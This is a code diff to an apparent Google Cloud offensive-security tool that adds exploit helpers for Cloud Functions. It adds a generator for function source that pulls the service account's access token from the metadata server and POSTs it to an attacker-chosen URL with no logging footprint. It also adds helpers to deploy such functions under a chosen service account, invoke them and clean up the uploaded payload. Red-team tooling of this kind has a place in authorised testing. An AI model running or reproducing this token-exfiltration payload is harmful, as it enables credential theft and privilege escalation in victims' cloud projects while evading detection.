@@ -60,13 +60,14 @@ def check_format(value: str, pattern: str, label: str):
 ########### Save Operations for Objects
 
 def _create_function(
-        function_client: FunctionServiceClient, 
-        function_name: str, 
-        bucket_source: str, 
-        version: str, 
+        function_client: FunctionServiceClient,
+        function_name: str,
+        bucket_source: str,
+        version: str,
         entry_point: str,
-        sa: Optional[str] = None, 
-        debug: Optional[bool] = None
+        sa: Optional[str] = None,
+        debug: Optional[bool] = None,
+        env_vars: Optional[Dict[str, str]] = None,
     ) -> Union[CloudFunction, Function, None]:
     """Deploy a new function (gen1 or gen2) from a GCS source archive; return the created function.
 
@@ -81,24 +82,24 @@ def _create_function(
     parent = f"projects/{project_id}/locations/{region}" if project_id and region else ""
 
     if version == "1":
-        
+
         try:
 
-            function = {
-                "source_archive_url": bucket_source,
-                "name": function_name,
-                "entry_point": entry_point,
-                "runtime": "python312",
-                "https_trigger": {}
-            }
-         
-            if sa: 
-                function["service_account_email"] = sa
-            
+            fn = functions_v1.CloudFunction(
+                source_archive_url=bucket_source,
+                name=function_name,
+                entry_point=entry_point,
+                runtime="python310",
+                https_trigger=functions_v1.HttpsTrigger(),
+            )
+            if sa:
+                fn.service_account_email = sa
+            if env_vars:
+                fn.environment_variables.update(env_vars)
 
             request = functions_v1.CreateFunctionRequest(
                 location=parent,
-                function=function
+                function=fn,
             )
 
             operation = function_client.create_function(request=request)
@@ -106,9 +107,8 @@ def _create_function(
             print("[*] Waiting for V1 creation operation to complete, this might take some time...")
 
             response = operation.result()
-
-            update_status =  response
-
+            update_status = response
+            print(f"[*] Successfully created {function_name}")
 
         except Exception as exc:
             handle_service_error(
@@ -120,7 +120,6 @@ def _create_function(
                 return_not_enabled=False,
             )
 
-
     elif version == "2":
 
         try:
@@ -129,45 +128,44 @@ def _create_function(
             bucket_name = str(parsed.netloc or "").strip()
             object_path = str(parsed.path or "").lstrip("/")
 
-            
             build_config = {
                 "entry_point": entry_point,
-                "runtime":"python312",
+                "runtime": "python312",
                 "source": {
                     "storage_source": {
-                        'bucket':bucket_name,
-                        'object_':object_path
+                        "bucket": bucket_name,
+                        "object_": object_path
                     }
                 }
             }
-            
-            function = {
 
-                    "name": function_name,
-                    "build_config": build_config,
-                    "environment":"GEN_2",
+            function = {
+                "name": function_name,
+                "build_config": build_config,
+                "environment": "GEN_2",
             }
-            
+
+            service_config: Dict[str, Any] = {}
             if sa:
-                function["service_config"] = {
-                    "service_account_email": sa
-                }
+                service_config["service_account_email"] = sa
+            if env_vars:
+                service_config["environment_variables"] = env_vars
+            if service_config:
+                function["service_config"] = service_config
 
             request = functions_v2.CreateFunctionRequest(
                 parent=parent,
                 function=function,
                 function_id=function_id
             )
-            
 
             operation = function_client.create_function(request=request)
 
             print("[*] Waiting for V2 creation operation to complete, this might take some time...")
 
             response = operation.result()
-            
             update_status = response
-
+            print(f"[*] Successfully created {function_name}")
 
         except Exception as exc:
             handle_service_error(
@@ -179,59 +177,55 @@ def _create_function(
                 return_not_enabled=False,
             )
 
-
-    print(f"[*] Successfully created {function_name}")
-
     return update_status
 
 # Note add generate_upload_url option
 def _update_function(
-    function_client: FunctionServiceClient, 
-    function_name: str, 
-    bucket_source: str, 
-    version: str,  
+    function_client: FunctionServiceClient,
+    function_name: str,
+    bucket_source: str,
+    version: str,
     entry_point: str,
-    sa: Optional[str] = None, 
-    debug: Optional[bool]=None
-    )-> Union[Policy, None]:
-    """Update an existing function's source/entrypoint/SA (gen1 or gen2); return the updated function.
-
-    PRIVESC: like create, ``sa`` re-points the function at a chosen service account and the new
-    source code runs as it. Uses an update_mask so only code/SA fields change. Blocks on the op.
-    """
+    sa: Optional[str] = None,
+    debug: Optional[bool] = None,
+    env_vars: Optional[Dict[str, str]] = None,
+) -> Union[Policy, None]:
     if debug:
         print(f"[*] Updating function {function_name}")
 
     update_status = None
-        
+    project_id = extract_path_segment(function_name, "projects")
+
     if version == "1":
-        
+
         try:
 
-            function = {
-                "source_archive_url": bucket_source,
-                "name":function_name,
-                "entry_point": entry_point
-                
-            }
-            if sa: 
-                function["service_account_email"] = sa
-
-
+            update_mask_fields = ["entryPoint", "sourceArchiveUrl", "runtime"]
+            fn = functions_v1.CloudFunction(
+                source_archive_url=bucket_source,
+                name=function_name,
+                entry_point=entry_point,
+                runtime="python310",
+            )
+            if sa:
+                fn.service_account_email = sa
+                update_mask_fields.append("serviceAccountEmail")
+            if env_vars:
+                fn.environment_variables.update(env_vars)
+                update_mask_fields.append("environmentVariables")
 
             request = functions_v1.UpdateFunctionRequest(
-                update_mask="entryPoint,sourceArchiveUrl,serviceAccountEmail",
-                function=function
+                update_mask=",".join(update_mask_fields),
+                function=fn,
             )
 
-            # Make the request
             operation = function_client.update_function(request=request)
 
             print("[*] Waiting for update operation on V1 to complete, this might take awhile...")
 
             response = operation.result()
             update_status = response
-
+            print("[*] Successfully updated the function")
 
         except Exception as exc:
             handle_service_error(
@@ -239,31 +233,27 @@ def _update_function(
                 api_name="cloudfunctions.functions.update [v1]",
                 resource_name=function_name,
                 service_label="Cloud Functions",
-                project_id=function_name,
+                project_id=project_id,
                 return_not_enabled=False,
             )
 
     elif version == "2":
-        
+
         try:
 
-            # object_zip format will be gs://bucket_name/path
             parsed = urlparse(bucket_source)
             object_zip = str(parsed.path or "").lstrip("/")
             bucket = str(parsed.netloc or "").strip()
 
-            source_config = {
-                "storage_source": {
-                    'bucket':bucket,
-                    'object_':object_zip
-                }
-            }
-            
-            # What to set code as and version
             build_config = {
                 "entry_point": entry_point,
-                "runtime":"python312",
-                "source": source_config
+                "runtime": "python312",
+                "source": {
+                    "storage_source": {
+                        "bucket": bucket,
+                        "object_": object_zip
+                    }
+                }
             }
 
             function = {
@@ -271,24 +261,28 @@ def _update_function(
                 "build_config": build_config
             }
 
+            update_mask = "buildConfig.entryPoint,buildConfig.runtime,buildConfig.source.storageSource"
+            service_config: Dict[str, Any] = {}
             if sa:
-                service_config = {
-                    "service_account_email": sa
-                }
+                service_config["service_account_email"] = sa
+                update_mask += ",serviceConfig.serviceAccountEmail"
+            if env_vars:
+                service_config["environment_variables"] = env_vars
+                update_mask += ",serviceConfig.environmentVariables"
+            if service_config:
                 function["service_config"] = service_config
 
-
             request = functions_v2.UpdateFunctionRequest(
-                update_mask="buildConfig.entryPoint,buildConfig.runtime,buildConfig.source.storageSource,serviceConfig.serviceAccountEmail",
+                update_mask=update_mask,
                 function=function
             )
 
-            # Make the request
             operation = function_client.update_function(request=request)
             print("[*] Waiting for update operation on V2 to complete, this might take awhile...")
 
             response = operation.result()
             update_status = response
+            print("[*] Successfully updated the function")
 
         except Exception as exc:
             handle_service_error(
@@ -296,20 +290,18 @@ def _update_function(
                 api_name="cloudfunctions.functions.update [v2]",
                 resource_name=function_name,
                 service_label="Cloud Functions",
-                project_id=function_name,
+                project_id=project_id,
                 return_not_enabled=False,
             )
-
-    print("[*] Successfully uploaded the designated function")
 
     return update_status
 
 
 def _call_function(
-        function_client_v1: FunctionServiceClient, 
-        function_name: str, 
-        version:str, 
-        auth_json: Optional[Dict] = None, 
+        function_client_v1: FunctionServiceClient,
+        function_name: str,
+        version:str,
+        auth_json: Optional[Dict] = None,
         debug: Optional[str] = False
     )-> Union[Policy, None]:
     """Invoke a function and return its response body; gen2 is hand-rolled over REST.
@@ -345,11 +337,11 @@ def _call_function(
                 project_id=function_name,
                 return_not_enabled=False,
             )
-        
+
     # Manual Build with REST APIs due to no API for V2 functions (Can't use V1 client)
-    elif version == "2":   
+    elif version == "2":
         fail_string = "[X] Cannot invoke V2 functions from the python libraries at the moment due to the need for an identity token. If you have access to the google account via a web browser, navigate to the function and go to 'testing'. Run the CLI test command in cloud shell if possible to get the email/token back. Once these are returned add via normal command line via 'creds add --type Oauth2 --token <token>"
-             
+
         try:
             grant_type = "refresh_token"
             if "token_uri" in auth_json.keys():
@@ -377,7 +369,7 @@ def _call_function(
                 headers = {
                     "Content-Type": "application/x-www-form-urlencoded"
                 }
-                
+
                 response = requests.post(token_uri, data=arguments, headers=headers)
 
                 if response.status_code == 200:
@@ -388,14 +380,14 @@ def _call_function(
                     else:
                         print(fail_string)
                         return -1
-                
+
                     simple_name = extract_path_segment(function_name, "functions")
                     region = extract_path_segment(function_name, "locations")
                     project = extract_project_id_from_resource(function_name)
 
 
                     url = f"https://{region}-{project}.cloudfunctions.net/{simple_name}"
-                    
+
                     headers = {
                         'Authorization': f'bearer {identity_token}',
                         'Content-Type': 'application/json'
@@ -411,7 +403,7 @@ def _call_function(
 
         except Exception as e:
 
-            UtilityTools.print_500(project, "cloudfunctions.functions.invoke [v2 - custom]", e)  
+            UtilityTools.print_500(project, "cloudfunctions.functions.invoke [v2 - custom]", e)
 
     if debug:
         print("[DEBUG] Successfully completed functions cloudfunctions.functions.invoke ..")
@@ -419,10 +411,51 @@ def _call_function(
     return response_data
 
 
+def _build_url_payload_zip(exfil_url: str) -> bytes:
+    """Build a Cloud Functions source zip with the callback URL baked into the code.
+
+    Returns raw zip bytes. The generated function POSTs the token to exfil_url and
+    returns a minimal JSON body — no log markers are printed (zero Cloud Logging footprint).
+    """
+    import io
+    import zipfile as _zf
+
+    main_py = "\n".join([
+        "import json, urllib.request",
+        "_BASE = 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/'",
+        "_HDR = {'Metadata-Flavor': 'Google'}",
+        "_EXFIL_URL = " + repr(exfil_url),
+        "",
+        "def data_exfil(request):",
+        "    def _get(path):",
+        "        req = urllib.request.Request(_BASE + path, headers=_HDR)",
+        "        with urllib.request.urlopen(req, timeout=5) as r:",
+        "            return r.read().decode()",
+        "    try:",
+        "        email = _get('email').strip()",
+        "        token = json.loads(_get('token'))",
+        "        access_token = token.get('access_token', '')",
+        "        body = json.dumps({'email': email, 'access_token': access_token}).encode()",
+        "        cb = urllib.request.Request(",
+        "            _EXFIL_URL, data=body,",
+        "            headers={'Content-Type': 'application/json'}, method='POST'",
+        "        )",
+        "        try: urllib.request.urlopen(cb, timeout=10)",
+        "        except Exception: pass",
+        "        return {'email': email, 'access_token': access_token}",
+        "    except Exception as exc:",
+        "        return {'error': str(exc)}, 500",
+    ])
+    buf = io.BytesIO()
+    with _zf.ZipFile(buf, "w", _zf.ZIP_DEFLATED) as zf:
+        zf.writestr("main.py", main_py)
+    return buf.getvalue()
+
+
 # Mirroring check_bucket_existence from Rhino Security: https://github.com/RhinoSecurityLabs/GCPBucketBrute
 def check_anonymous_external(
-        function_name: Optional[str] = None, 
-        function_url: Optional[str] = None, 
+        function_name: Optional[str] = None,
+        function_url: Optional[str] = None,
         printout: Optional[bool] = False,
         debug: Optional[bool] = False
     ):
@@ -448,15 +481,15 @@ def check_anonymous_external(
         if printout:
             print(f"[*] Function {function_url} is available to anonymous users")
         return True
-   
+
     if debug:
         print(f"[DEBUG] Function {function_url} returned {response.status_code}. Does not exist.")
-    
+
     return False
 
 def list_functions(
-        function_client: FunctionServiceClient, 
-        parent: str, 
+        function_client: FunctionServiceClient,
+        parent: str,
         debug: Optional[bool] = False
     ):
     """List functions (gen1+gen2) under a project/location parent via the v2 client.
@@ -466,7 +499,7 @@ def list_functions(
     """
     if debug:
         print(f"[DEBUG] Listing functions for project {parent} ...")
-    
+
     function_list = []
 
     try:
@@ -489,18 +522,18 @@ def list_functions(
 
     if debug:
         print(f"[DEBUG] Successfully called list_functions for {parent} ...")
-    
+
     return function_list
 
 def get_function(
-        function_client: FunctionServiceClient, 
-        function_name: str, 
+        function_client: FunctionServiceClient,
+        function_name: str,
         debug: Optional[bool] = False
     ):
     """Fetch a single function's metadata via the v2 client; returns the function or None."""
     if debug:
         print(f"[DEBUG] Getting function {function_name} ...")
-    
+
     function_meta = None
 
     try:
@@ -530,7 +563,7 @@ def get_function(
         print(f"[DEBUG] Successfully called list_functions for {function_name} ...")
 
     # Handle the response
-    
+
     return function_meta
 
 
@@ -573,6 +606,7 @@ class CloudFunctionsResource:
     def __init__(self, session):
         self.session = session
         self.client = functions_v2.FunctionServiceClient(credentials=session.credentials)
+        self.client_v1 = functions_v1.CloudFunctionsServiceClient(credentials=session.credentials)
         self._unsupported_test_iam_permissions: set[str] = set()
 
     @staticmethod
@@ -589,10 +623,10 @@ class CloudFunctionsResource:
 
     @staticmethod
     def _build_download_path(
-        *, 
-        function_name: str, 
+        *,
+        function_name: str,
         environment: str,
-        output: str | None, 
+        output: str | None,
         project_id: str | None,
         session,
     ) -> Path:
@@ -838,6 +872,158 @@ class CloudFunctionsResource:
                     "project_id": extract_project_id_from_resource(raw.get("name", "")),
                 },
             )
+
+    # ------------------------------------------------------------------
+    # Exploit helpers (create / update / invoke / delete)
+    # ------------------------------------------------------------------
+
+    def create(self, *, function_name: str, source_uri: str, version: str,
+               entry_point: str = "data_exfil", sa: Optional[str] = None,
+               env_vars: Optional[Dict[str, str]] = None):
+        client = self.client_v1 if version == "1" else self.client
+        return _create_function(
+            client, function_name, source_uri, version, entry_point,
+            sa=sa, env_vars=env_vars,
+        )
+
+    def update(self, *, function_name: str, source_uri: str, version: str,
+               entry_point: str = "data_exfil", sa: Optional[str] = None,
+               env_vars: Optional[Dict[str, str]] = None):
+        client = self.client_v1 if version == "1" else self.client
+        return _update_function(
+            client, function_name, source_uri, version, entry_point,
+            sa=sa, env_vars=env_vars,
+        )
+
+    def get_invoke_url(self, *, function_name: str) -> str:
+        """Return the HTTPS trigger URL for a function (works for V1 and V2)."""
+        region = extract_path_segment(function_name, "locations")
+        project = extract_project_id_from_resource(function_name)
+        simple_name = extract_path_segment(function_name, "functions")
+        return f"https://{region}-{project}.cloudfunctions.net/{simple_name}"
+
+    def invoke_v1(self, *, function_name: str) -> Optional[str]:
+        """Invoke a V1 function via the SDK; return response text or None."""
+        try:
+            client_v1 = functions_v1.CloudFunctionsServiceClient(credentials=self.session.credentials)
+            req = functions_v1.CallFunctionRequest(name=function_name, data="test")
+            resp = client_v1.call_function(request=req)
+            return resp.result
+        except Exception as exc:
+            handle_service_error(
+                exc,
+                api_name="cloudfunctions.functions.invoke [v1]",
+                resource_name=function_name,
+                service_label="Cloud Functions",
+                project_id=extract_project_id_from_resource(function_name),
+                return_not_enabled=False,
+            )
+            return None
+
+    def invoke_v2(self, *, function_name: str) -> Optional[str]:
+        """Invoke a V2 function via REST with an OIDC identity token; return response text or None.
+
+        Prefers SA-credential ID token minting (service account keys); falls back to access token
+        (which may get a 401 on private functions if the caller is a user credential).
+        """
+        from google.auth.transport.requests import Request as _GAuthReq
+
+        url = self.get_invoke_url(function_name=function_name)
+        creds = self.session.credentials
+        id_token: Optional[str] = None
+
+        # SA credentials: mint an OIDC ID token directly
+        try:
+            from google.oauth2.service_account import IDTokenCredentials as _IDTCreds
+            _TOKEN_URI = "https://oauth2.googleapis.com/token"
+            id_creds = _IDTCreds(
+                creds._signer,
+                service_account_email=creds.service_account_email,
+                token_uri=_TOKEN_URI,
+                target_audience=url,
+            )
+            id_creds.refresh(_GAuthReq())
+            id_token = id_creds.token
+        except (AttributeError, Exception):
+            pass
+
+        # Fallback: access token (works if function is public or caller has run.invoker)
+        if not id_token:
+            if not creds.valid:
+                creds.refresh(_GAuthReq())
+            id_token = creds.token
+
+        try:
+            resp = requests.post(
+                url,
+                headers={"Authorization": f"Bearer {id_token}", "Content-Type": "application/json"},
+                json={"data": "test"},
+                timeout=70,
+            )
+            return resp.text
+        except Exception as e:
+            print(f"{UtilityTools.YELLOW}[!] V2 invoke error: {e}{UtilityTools.RESET}")
+            return None
+
+    def invoke(self, *, function_name: str, version: str) -> Optional[str]:
+        """Invoke a Cloud Function (V1 or V2); return response text or None."""
+        if version == "1":
+            return self.invoke_v1(function_name=function_name)
+        return self.invoke_v2(function_name=function_name)
+
+    def delete(self, *, function_name: str, version: str) -> bool:
+        """Delete a function; blocks on the V2 LRO. Returns True on success."""
+        try:
+            if version == "1":
+                client_v1 = functions_v1.CloudFunctionsServiceClient(credentials=self.session.credentials)
+                client_v1.delete_function(name=function_name)
+            else:
+                op = self.client.delete_function(name=function_name)
+                op.result()
+            return True
+        except Exception as exc:
+            handle_service_error(
+                exc,
+                api_name="cloudfunctions.functions.delete",
+                resource_name=function_name,
+                service_label="Cloud Functions",
+                project_id=extract_project_id_from_resource(function_name),
+                return_not_enabled=False,
+            )
+            return False
+
+    def build_and_upload_url_payload(self, *, exfil_url: str, bucket: str, project_id: str) -> Optional[str]:
+        """Build a URL-baked source zip and upload to GCS. Returns the gs:// URI or None on error."""
+        import time as _t
+        zip_bytes = _build_url_payload_zip(exfil_url)
+        obj_name = f"gcpwn-cf-url-{int(_t.time())}.zip"
+        dest_uri = f"gs://{bucket}/{obj_name}"
+        try:
+            sc = storage.Client(credentials=self.session.credentials, project=project_id)
+            sc.bucket(bucket).blob(obj_name).upload_from_string(zip_bytes, content_type="application/zip")
+            return dest_uri
+        except Exception as exc:
+            handle_service_error(
+                exc,
+                api_name="storage.objects.create",
+                resource_name=dest_uri,
+                service_label="Cloud Storage",
+                project_id=project_id,
+                return_not_enabled=False,
+            )
+            return None
+
+    def delete_gcs_object(self, *, gcs_uri: str, project_id: str) -> bool:
+        """Delete a GCS object by gs:// URI. Returns True on success."""
+        stripped = gcs_uri[5:]  # remove "gs://"
+        bucket = stripped.split("/")[0]
+        obj = "/".join(stripped.split("/")[1:])
+        try:
+            sc = storage.Client(credentials=self.session.credentials, project=project_id)
+            sc.bucket(bucket).blob(obj).delete()
+            return True
+        except Exception:
+            return False
 
     def check_external_curl(self, *, function_url: str):
         return check_anonymous_external(function_url=function_url)
